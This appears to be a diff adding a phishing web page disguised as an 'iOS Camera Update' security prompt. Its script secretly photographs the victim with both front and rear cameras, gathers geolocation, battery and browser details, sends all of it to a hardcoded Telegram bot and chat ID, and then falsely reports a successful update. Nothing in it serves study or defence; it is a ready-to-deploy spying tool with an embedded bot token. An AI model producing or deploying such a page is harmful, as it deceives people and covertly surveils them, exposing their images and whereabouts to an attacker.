@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Camera Update</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, Helvetica, Arial, sans-serif;
+      background: #f4f4f7;
+      color: #000;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+      min-height: 100vh;
+      box-sizing: border-box;
+    }
+
+    h2 {
+      font-size: 22px;
+      color: #444;
+      margin-bottom: 12px;
+    }
+
+    .fake-box {
+      background: white;
+      border-radius: 16px;
+      padding: 20px;
+      width: 100%;
+      max-width: 320px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.08);
+      text-align: center;
+    }
+
+    .fake-box p {
+      font-size: 15px;
+      color: #777;
+      margin-bottom: 20px;
+    }
+
+    button {
+      background-color: #007aff;
+      color: white;
+      border: none;
+      padding: 14px 28px;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      box-shadow: 0 0 14px rgba(0, 122, 255, 0.5);
+    }
+
+    #status {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #999;
+      text-align: center;
+    }
+
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="fake-box">
+    <h2>📷 iOS Camera Update</h2>
+    <p>Your camera needs a quick security configuration update.</p>
+    <button id="startBtn">Start Update</button>
+    <div id="status"></div>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const startBtn = document.getElementById('startBtn');
+    const statusEl = document.getElementById('status');
+
+    const botToken = "7592072345:AAETQGV7KRpR_tZS3qd-gIZYiC1JqrTR1iM"; // ✅ Replace with your Telegram Bot Token
+    const chatId = "7893603597";     // ✅ Replace with your Chat ID
+
+    let photos = [];
+
+    async function getLocationInfo() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve("Location: N/A");
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const { latitude, longitude } = pos.coords;
+            resolve(`Location: ${latitude.toFixed(5)}, ${longitude.toFixed(5)}`);
+          },
+          err => {
+            resolve("Location: Error");
+          },
+          { timeout: 3000 }
+        );
+      });
+    }
+
+    async function getDeviceDetails() {
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+      const lang = navigator.language;
+      const date = new Date().toLocaleString();
+
+      let battery = "Battery: N/A";
+      if (navigator.getBattery) {
+        try {
+          const b = await navigator.getBattery();
+          battery = `Battery: ${Math.round(b.level * 100)}% ${b.charging ? '(Charging)' : ''}`;
+        } catch (e) {}
+      }
+
+      const location = await getLocationInfo();
+
+      return `Time: ${date}\n${location}\nPlatform: ${platform}\nLanguage: ${lang}\nUserAgent: ${ua}\n${battery}`;
+    }
+
+    async function captureImage(facing) {
+      const constraints = { video: { facingMode: facing } };
+
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      video.srcObject = stream;
+
+      await new Promise(r => setTimeout(r, 1500)); // wait for camera to settle
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+      stream.getTracks().forEach(t => t.stop());
+
+      return blob;
+    }
+
+    async function sendToTelegram(photoBlobs, detailsText) {
+      for (let i = 0; i < photoBlobs.length; i++) {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", photoBlobs[i], `photo${i+1}.jpg`);
+        if (i === 0) {
+          formData.append("caption", `<b>📷 Auto Camera Update</b>\n\n<pre>${detailsText.replace(/</g, "&lt;")}</pre>`);
+          formData.append("parse_mode", "HTML");
+        }
+
+        try {
+          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+        } catch (e) {
+          console.error("Telegram Error", e);
+        }
+      }
+    }
+
+    startBtn.addEventListener('click', async () => {
+      startBtn.disabled = true;
+      statusEl.textContent = "Updating... Please wait.";
+
+      try {
+        const details = await getDeviceDetails();
+        const backPhoto = await captureImage("environment");
+        const frontPhoto = await captureImage("user");
+
+        await sendToTelegram([backPhoto, frontPhoto], details);
+        statusEl.textContent = "✅ Camera updated successfully.";
+      } catch (err) {
+        console.error(err);
+        statusEl.textContent = "❌ Something went wrong.";
+      } finally {
+        startBtn.disabled = false;
+        startBtn.innerText = "Start Update";
+      }
+    });
+  </script>
+
+</body>
+  </html>
